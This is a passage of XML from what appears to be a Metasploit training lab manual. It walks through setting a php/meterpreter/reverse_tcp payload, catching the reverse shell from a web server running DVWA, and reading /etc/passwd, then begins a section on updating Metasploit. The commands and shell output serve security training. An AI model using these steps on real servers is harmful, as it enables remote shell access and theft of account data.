        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit(handler) &gt; set payload php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F7CDCB7" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>payload =&gt; php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="642C159F" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit(handler) &gt; show options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4656FF" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47842D22" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>Module options (exploit/multi/handler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C4498B" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69462B51" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Name  Current</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Setting  Required  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F8A9C1" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   ----  ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35951719" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33A3E696" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D1CD6D" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>Payload options (php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C2ACA2" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F659B1E" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   Name   Current </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Setting  Required</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">  Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FCA6B0" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   ----   ---------------  --------  -----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72939124" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   LHOST                   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>yes</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">       The listen address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2233FECD" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   LPORT  4444             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>yes</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">       The listen port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC2C787" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E6D63B4" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3596CC2E" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>Exploit target:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7523C7BD" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78B2A55A" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id  Name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="787E6C19" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   --  ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2505E568" w14:textId="77777777" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF" w:rsidP="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   0   Wildcard Target</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8B6BB2" w14:textId="4A964D8F" w:rsidR="00FE32DF" w:rsidRDefault="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Set the options as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726BD196" w14:textId="3497D68A" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lhost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 10.1.10.24</w:t>
      </w:r>
      <w:r w:rsidR="00D75B04">
        <w:t>0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B349CBD" w14:textId="7CC9F9C7" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B804013" w14:textId="36F6242A" w:rsidR="0001315B" w:rsidRDefault="0001315B" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lhost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1BD62518" w14:textId="1C952EDD" w:rsidR="0001315B" w:rsidRDefault="0001315B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These options are the ‘local’ listening IP and port for the exploit.  Note that the IP here is the internal </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>NAT’d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IP address.  In the above php code you entered the External </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>NAT’d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22338D15" w14:textId="2CC2C076" w:rsidR="0016058D" w:rsidRDefault="0016058D">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Return to your web browser on the Windows PC and refresh the page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F244DEF" w14:textId="25C51E30" w:rsidR="00FE32DF" w:rsidRPr="00655A98" w:rsidRDefault="00FE32DF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Now we can start the server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21233741" w14:textId="3C177D97" w:rsidR="007A1A1E" w:rsidRDefault="007A1A1E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C39E86A" w14:textId="5E6ADC65" w:rsidR="0016058D" w:rsidRDefault="0016058D" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4495F63E" w14:textId="688965BD" w:rsidR="0016058D" w:rsidRPr="0016058D" w:rsidRDefault="0016058D">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Exploit is the fun command… here we are running the exploit we want to see.  You can also use ‘run’ but exploit is so much more Hacker.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29346732" w14:textId="389F127C" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="003A1ACF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>After a few seconds, you should see:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD28C4A" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Started reverse TCP handler on 10.1.10.240:4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5CE872" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Starting the payload handler...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264E3708" w14:textId="400E4CCA" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[*] Sending stage (33986 bytes) to </w:t>
      </w:r>
      <w:r w:rsidR="00D75B04">
        <w:t>&lt;YOURIP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A1EAAD" w14:textId="48905D61" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Meterpreter session 3 opened (10.1.10.240:4444 -&gt; &lt;IP</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;:PORT</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>) at &lt;Date&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4994E33B" w14:textId="2E1E4095" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>And then a moment or two later:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A05CA9" w14:textId="2E23C2A1" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F72EDE">
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F72EDE">
        <w:t xml:space="preserve"> &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEE6DCF" w14:textId="027CDBA0" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc487296567"/>
      <w:r>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="0B02314A" w14:textId="6B586640" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Meterpreter is the “Swiss Army Knife” of the Metasploit Framework.  You can open a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> console up through an exploit, like we just did.  In this case, we set up Metasploit to listen for incoming traffic on port 4444 on our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0016058D">
        <w:t>NAT’d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0016058D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">internet address.  We had to do this because the DMZ address isn’t accessible by the Web </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Server</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> but it is allowed to connect to the internet.  We then run the </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>uploaded php code we generated which opens the connection and now we’re able to run commands on the web server as though we had an ssh-like connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B650366" w14:textId="03FB247C" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Let’s examine the web server so see what we can find.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5270250E" w14:textId="3F24B14F" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>In the Meterpreter shell type:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F72EDE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB2F0B9" w14:textId="5DA8868E" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253EE4B5" w14:textId="6D9671E7" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>We can the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5905BEBD" w14:textId="763B0D0A" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4C73484E" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>Listing: /var/www/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dvwa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/hackable/uploads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA9A489" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>=======================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3320631B" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Mode              </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Size  Type</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">  Last modified              Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C86D9A6" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>----              ----  ----  -------------              ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C58A326" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>100644/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-r--r</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>--  667</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">   fil   2013-07-08 12:55:06 -0400  dvwa_email.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F77CDBC" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>100644/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-r--r</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>--  950</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">   fil   2017-06-19 09:11:52 -0400  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hackdvwa.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="421C7279" w14:textId="77777777" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>100644/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-r--r</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>--  951</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">   fil   2017-06-14 13:50:15 -0400  hackme.php.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42270D81" w14:textId="097BE04B" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>We can see what accounts are on this server by typing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70585763" w14:textId="43E48369" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Tablecopy"/>
      </w:pPr>
      <w:r>
        <w:t>cat /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309229D6" w14:textId="0094B3C3" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To see a list of the commands that are available to you, you can type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>help</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at any point</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C0E993" w14:textId="29DD15F5" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Feel free to investigate the web server, when you’re finished type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the Meterpreter shell will close.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A031EC" w14:textId="5466569A" w:rsidR="00F72EDE" w:rsidRDefault="00F72EDE">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Note that when you close the session, the web page finally ends spinning.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3310D873" w14:textId="7FA4C75B" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc487296568"/>
      <w:r>
        <w:t xml:space="preserve">Exercise </w:t>
      </w:r>
      <w:r w:rsidR="0016058D">
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t>: Metasploit Utilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="180AA44D" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Update Metasploit application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4DED52" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>In order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> stay current, you need to update your copy of the Metasploit regularly.  Issue the following command from the Kali bash command shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27964A57" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>root@kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> apt-get update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAEC6A5" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRPr="00195492" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Note"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note on non-Kali installs of Metasploit, you can issue the command </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>msfupdate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> within the Metasploit </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>console</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> but this is disabled in recent releases of Kali in favor of using the apt-get command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B077605" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Update the Exploit database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38475BA2" w14:textId="13DD1D03" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
